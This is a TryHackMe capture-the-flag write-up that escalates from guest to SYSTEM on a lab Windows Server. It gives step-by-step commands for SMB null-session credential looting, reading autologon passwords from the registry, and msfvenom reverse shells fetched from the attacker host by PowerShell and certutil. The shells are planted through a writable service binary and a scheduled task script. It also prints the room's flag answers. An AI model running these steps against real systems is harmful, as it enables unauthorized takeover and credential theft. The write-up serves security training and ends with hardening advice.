# Windows Jump 
##                - Use privilege escalation knowledge to jump from a guest user to SYSTEM.

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — SMB Enumeration & Credential Leak](#step-2--smb-enumeration--credential-leak)
- [Step 3 — RDP Login & Flag 1](#step-3--rdp-login--flag-1)
- [Step 4 — Registry Autologon Credential Disclosure](#step-4--registry-autologon-credential-disclosure)
- [Step 5 — Privilege Escalation to notadmin & Flag 2](#step-5--privilege-escalation-to-notadmin--flag-2)
- [Step 6 — Service Binary Hijack & Flag 3](#step-6--service-binary-hijack--flag-3)
- [Step 7 — Scheduled Task Hijack → SYSTEM & Flag 4](#step-7--scheduled-task-hijack--system--flag-4)
- [Flags Summary](#flags-summary)
- [Vulnerability Summary](#vulnerability-summary)
- [Attack Chain](#attack-chain)
- [Key Takeaways](#key-takeaways)

---

## Challenge Overview

| Field       | Details                                              |
|-------------|--------------------------------------------------------|
| Name        | Windows Jump                                            |
| Platform    | TryHackMe                                               |
| Difficulty  | Medium                                                  |
| Category    | Windows Privilege Escalation                            |
| Target IP   | 10.48.151.192                                           |
| Attacker IP | 10.48.114.16                                            |
| OS          | Windows Server 2019 (Build 17763)                       |
| Objective   | Escalate privileges through 4 stages to reach SYSTEM    |

---

## Step 1 — Nmap Scan

Started with an aggressive Nmap scan to identify open ports, running services, and the operating system of the target.

**Command:**
```bash
nmap -A 10.48.151.192
```

> **Command Breakdown:**
> - `-A` — Enables OS detection, version detection, script scanning, and traceroute all in one (aggressive scan).

**Scan Results:**

| Port      | State | Service        | Version                          |
|-----------|-------|----------------|-----------------------------------|
| 135/tcp   | open  | msrpc          | Microsoft Windows RPC              |
| 139/tcp   | open  | netbios-ssn    | Microsoft Windows netbios-ssn      |
| 445/tcp   | open  | microsoft-ds   | SMB                                 |
| 3389/tcp  | open  | ms-wbt-server  | Microsoft Terminal Services (RDP)  |

> **Key Observations:**
> - **Port 445 (SMB)** is open — a good starting point for unauthenticated/guest enumeration
> - **Port 3389 (RDP)** is open — if credentials are found, this provides full GUI access
> - Target is running **Windows Server 2019**

---

## Step 2 — SMB Enumeration & Credential Leak

With SMB open on port 445, attempted to list available shares using a **null/guest session** (no valid credentials).

**Command:**
```bash
smbclient -L //10.48.151.192/ -U ""
```

**Shares Found:**

| Share Name | Type | Comment           |
|------------|------|-------------------|
| ADMIN$     | Disk | Remote Admin      |
| C$         | Disk | Default share     |
| IPC$       | IPC  | Remote IPC        |
| Public     | Disk | Public file share |

> The **`Public`** share stands out — `ADMIN$` and `C$` are default administrative shares and typically require admin credentials, but `Public` looks custom and worth exploring.

**Connected to the Public share:**
```bash
smbclient //10.48.151.192/public -U ""
```

**Listed and downloaded the file:**
```
smb: \> ls
welcome.txt    A    177 bytes

smb: \> get welcome.txt
```

**Contents of welcome.txt:**
```
New employee default credentials
================================
Username : thmuser
Password : Password1!
```

> 🔑 **Credentials Found:**
> - **Username:** `thmuser`
> - **Password:** `Password1!`
>
> Since RDP (port 3389) is open, these credentials can be used to log in remotely.

---

## Step 3 — RDP Login & Flag 1

Used the leaked credentials to connect to the target over RDP using `xfreerdp`.

**Command:**
```bash
xfreerdp /u:thmuser /p:Password1! /v:10.48.151.192 /dynamic-resolution
```

> **Command Breakdown:**
> - `/dynamic-resolution` — Automatically adjusts the remote session resolution to match the local window

Once logged in, navigated to the user's desktop and found the first flag.

**Commands:**
```cmd
cd C:\Users\thmuser\Desktop
dir
type flag1.txt
```

**Output:**
```
THM{5mb_cr3d5_1n_th3_5h4r3}
```

> 🚩 **Flag 1:** `THM{5mb_cr3d5_1n_th3_5h4r3}`

---

## Step 4 — Registry Autologon Credential Disclosure

While exploring the system as `thmuser`, queried the **Winlogon** registry key — a common location where misconfigured systems store **autologon credentials in plaintext**.

**Command:**
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

> **Command Breakdown:**
> - `reg query` — Reads values from the Windows Registry
> - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` — The registry path responsible for controlling the Windows login process, including autologon settings

**Key Output:**
```
AutoAdminLogon       REG_SZ      1
DefaultUserName      REG_SZ      notadmin
DefaultPassword      REG_SZ      P@ssw0rd!
LastUsedUsername     REG_SZ      notadmin
```

> 🔑 **Credentials Found (stored in plaintext in the registry):**
> - **Username:** `notadmin`
> - **Password:** `P@ssw0rd!`
>
> The `AutoAdminLogon` value being set to `1` means Windows is configured to automatically log in as this user on boot — and the password is stored unencrypted for that purpose, which is a serious misconfiguration.

---

## Step 5 — Privilege Escalation to notadmin & Flag 2

Used the `runas` utility to switch to the `notadmin` user account using the credentials found in the registry.

**Command:**
```cmd
runas /user:PRIVESC\notadmin cmd.exe
```

> **Command Breakdown:**
> - `runas` — Allows a user to run specific programs/commands as a different user
> - `/user:PRIVESC\notadmin` — Specifies the target user account (`PRIVESC` is the local machine/domain name, `notadmin` is the username)
> - `cmd.exe` — The program to launch under the new user's context (a new command prompt)

When prompted, entered the password `P@ssw0rd!`. This opened a new `cmd.exe` session running as `notadmin`.

**Retrieved the second flag:**
```cmd
cd C:\Users\notadmin\Desktop
type flag2.txt
```

**Output:**
```
THM{w1nl0g0n_cr3ds_3xp0s3d}
```

> 🚩 **Flag 2:** `THM{w1nl0g0n_cr3ds_3xp0s3d}`

---

## Step 6 — Service Binary Hijack & Flag 3

As `notadmin`, used `wmic` to search for any Windows services running under a different (potentially higher-privileged) user account.

**Command:**
```cmd
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

> **Command Breakdown:**
> - `wmic service get name,pathname,startname` — Lists every Windows service along with its executable path and the account it runs as
> - `findstr /i "svcadmin"` — Filters the output, searching case-insensitively (`/i`) for any line containing `svcadmin`

**Output:**
```
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

> Found a service called **THMSvc**, running as the user **svcadmin**, with its binary located at `C:\Windows\THMSVC\svc.exe`.

**Checked the folder permissions:**
```cmd
icacls C:\Windows\THMSVC
```

> **Command Breakdown:**
> - `icacls` — Displays or modifies Access Control Lists (ACLs) for files and folders, showing which users/groups have which permissions

**Output:**
```
C:\Windows\THMSVC  PRIVESC\notadmin:(OI)(CI)(F)
                   BUILTIN\Administrators:(OI)(CI)(F)
                   NT AUTHORITY\SYSTEM:(OI)(CI)(F)
```

> **Permission flags explained:**
> - `(OI)` — Object Inherit: applies to files within the folder
> - `(CI)` — Container Inherit: applies to subfolders
> - `(F)` — Full Control
>
> 🎯 **Critical finding:** `notadmin` has **Full Control (F)** over the `THMSVC` folder — meaning the service binary `svc.exe` can be **overwritten**. When the `THMSvc` service starts, it will execute our malicious binary with the privileges of `svcadmin`.

### Exploitation

**1. Generated a reverse shell payload with msfvenom (on attacker machine):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.114.16 LPORT=1234 -f exe -o svc.exe
```

> **Command Breakdown:**
> - `-p windows/x64/shell_reverse_tcp` — Payload type: a 64-bit Windows reverse shell
> - `LHOST` — The attacker's IP address (where the shell connects back to)
> - `LPORT` — The attacker's listening port
> - `-f exe` — Output format: a Windows executable
> - `-o svc.exe` — Output filename

**2. Started a Python HTTP server to host the payload (on attacker machine):**
```bash
python3 -m http.server 80
```

**3. Downloaded the malicious binary onto the target, overwriting the original service executable:**
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://10.48.114.16/svc.exe' -OutFile 'C:\Windows\THMSVC\svc.exe'"
```

> **Command Breakdown:**
> - `Invoke-WebRequest -Uri ... -OutFile ...` — PowerShell's equivalent of `wget`/`curl`, downloads a file from a URL and saves it to a local path

**4. Started a Netcat listener (on attacker machine):**
```bash
nc -nlvp 1234
```

> **Command Breakdown:**
> - `-n` — Skip DNS resolution
> - `-l` — Listen mode (wait for incoming connections)
> - `-v` — Verbose output
> - `-p 1234` — Listen on port 1234

**5. Started the hijacked service:**
```cmd
sc start THMSvc
```

> **Command Breakdown:**
> - `sc start` — Starts a Windows service by name. Since `THMSvc` runs as `svcadmin`, our replaced binary now executes with `svcadmin`'s privileges, connecting back to our listener.

**Output:**
```
SERVICE_NAME: THMSvc
        STATE              : 4  RUNNING
        PID                : 1060
```

A reverse shell was received as **`svcadmin`**. Retrieved the third flag:

```cmd
type C:\Users\svcadmin\Desktop\flag3.txt
```

**Output:**
```
THM{s3rv1c3_b1n4ry_h1j4ck3d}
```

> 🚩 **Flag 3:** `THM{s3rv1c3_b1n4ry_h1j4ck3d}`

---

## Step 7 — Scheduled Task Hijack → SYSTEM & Flag 4

As `svcadmin`, navigated to the Windows Tasks folder and inspected a scheduled cleanup script.

**Commands:**
```cmd
cd C:\Windows\Tasks
type cleanup.bat
```

**Output:**
```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

> This batch script deletes temporary files — and is likely run periodically by the **Task Scheduler under the SYSTEM account**.

**Checked permissions on the script:**
```cmd
icacls cleanup.bat
```

**Output:**
```
cleanup.bat   BUILTIN\Users:(I)(RX)
              PRIVESC\svcadmin:(I)(M)
              BUILTIN\Administrators:(I)(F)
              NT AUTHORITY\SYSTEM:(I)(F)
```

> 🎯 **Critical finding:** `svcadmin` has **Modify (M)** permission on `cleanup.bat`. If this script runs as a scheduled task under SYSTEM, replacing its contents will execute our payload with **SYSTEM privileges**.

### Exploitation

**1. Generated a second reverse shell payload (on attacker machine):**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.48.114.16 LPORT=4444 -f exe -o shell.exe
```

**2. Transferred `shell.exe` to the target** (via the Python web server, downloaded using `certutil`):
```cmd
certutil -urlcache -split -f http://10.48.114.16/shell.exe C:\Windows\Tasks\shell.exe
```

> **Command Breakdown:**
> - `certutil -urlcache -split -f <URL> <output>` — A built-in Windows utility (normally used for certificate management) that can be abused to download files from a URL — useful when PowerShell is restricted

**3. Overwrote `cleanup.bat` so that it launches the reverse shell instead of its original cleanup logic:**
```cmd
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

> **Command Breakdown:**
> - `echo ... > cleanup.bat` — Overwrites the file's contents with the specified text. When the Task Scheduler executes `cleanup.bat` as SYSTEM, it will instead run `shell.exe`.

**4. Started a new Netcat listener (on attacker machine) on port 4444 and waited for the scheduled task to trigger.**

Once the scheduled task executed, a reverse shell was received as **NT AUTHORITY\SYSTEM**. Retrieved the final flag:

```cmd
cd C:\
dir
type flag4.txt
```

**Output:**
```
THM{t4sk_wr1t3_t0_SYST3M}
```

> 🚩 **Flag 4 (SYSTEM):** `THM{t4sk_wr1t3_t0_SYST3M}`

---

## Flags Summary

| # | Flag                              | User Context | Method                                  |
|---|------------------------------------|---------------|------------------------------------------|
| 1 | `THM{5mb_cr3d5_1n_th3_5h4r3}`     | thmuser       | Credentials leaked via SMB share        |
| 2 | `THM{w1nl0g0n_cr3ds_3xp0s3d}`     | notadmin      | Plaintext credentials in Winlogon registry key |
| 3 | `THM{s3rv1c3_b1n4ry_h1j4ck3d}`    | svcadmin      | Hijacked writable service binary (THMSvc) |
| 4 | `THM{t4sk_wr1t3_t0_SYST3M}`       | SYSTEM        | Hijacked writable scheduled task (cleanup.bat) |

---

## Vulnerability Summary

| # | Vulnerability                          | Location                                      | Impact                                       |
|---|------------------------------------------|------------------------------------------------|-----------------------------------------------|
| 1 | Anonymous/Guest SMB access enabled       | `\\10.48.151.192\Public`                        | Leaked default employee credentials          |
| 2 | Plaintext credentials in welcome file    | `welcome.txt`                                   | Initial foothold via RDP as `thmuser`        |
| 3 | Plaintext autologon credentials in registry | `HKLM\...\Winlogon`                          | Credential disclosure for `notadmin`         |
| 4 | Weak folder permissions on service path  | `C:\Windows\THMSVC`                             | Service binary (`svc.exe`) hijack → `svcadmin` |
| 5 | Weak file permissions on scheduled task  | `C:\Windows\Tasks\cleanup.bat`                  | Scheduled task hijack → SYSTEM               |

---

## Attack Chain

```
Nmap scan → SMB (445) open → Null session → \Public share
→ welcome.txt → creds: thmuser / Password1!
→ RDP login → Flag 1
→ reg query Winlogon → creds: notadmin / P@ssw0rd!
→ runas notadmin → Flag 2
→ wmic service → THMSvc runs as svcadmin
→ icacls → notadmin has Full Control on C:\Windows\THMSVC
→ Replace svc.exe with reverse shell → sc start THMSvc
→ Shell as svcadmin → Flag 3
→ icacls cleanup.bat → svcadmin has Modify
→ Overwrite cleanup.bat with reverse shell payload
→ Scheduled task runs as SYSTEM → Shell as SYSTEM → Flag 4
```

---

## Key Takeaways

- **Disable anonymous/guest access to SMB shares** — even a "Public" share should never contain credentials
- **Never store default/onboarding credentials in plaintext files** on shared drives
- **Autologon via the registry (`AutoAdminLogon`)** stores passwords in plaintext and should be avoided entirely; use Credential Manager or Group Policy instead
- **Service binaries and their containing folders must be writable only by Administrators/SYSTEM** — a writable service path is a direct path to privilege escalation
- **Scheduled tasks that run as SYSTEM must have their script files locked down** — any user with Modify access can hijack the task's execution context
- Regularly audit folder and file permissions using `icacls` for any service-related paths, especially after software installations
- This challenge demonstrates a textbook **"credential chain" escalation**: each stage's compromise directly leaks the credentials or access needed for the next stage

---

*--Writeup by: [showrya] | Platform: TryHackMe | Room: Windows Jump*
